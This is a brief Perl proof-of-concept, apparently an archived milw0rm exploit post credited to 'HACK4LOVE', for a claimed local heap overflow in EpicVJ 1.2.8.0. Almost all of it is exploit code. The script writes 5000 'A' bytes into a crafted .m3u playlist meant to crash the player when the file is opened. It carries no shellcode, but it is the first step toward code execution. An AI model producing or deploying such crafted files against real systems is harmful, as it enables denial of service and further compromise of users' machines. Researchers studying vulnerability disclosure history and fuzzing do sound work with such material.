#!/usr/bin/perl
# Found By :: HACK4LOVE
# EpicVJ 1.2.8.0 (.mpl / .m3u ) Local heap Overflow PoC
# http://www.epicdjsoftware.com/
########################################################################################
########################################################################################
my $crash="\x41" x 5000;
open(myfile,'>>hack4love.m3u');
print myfile $crash;
########################################################################################

# milw0rm.com [2009-07-20]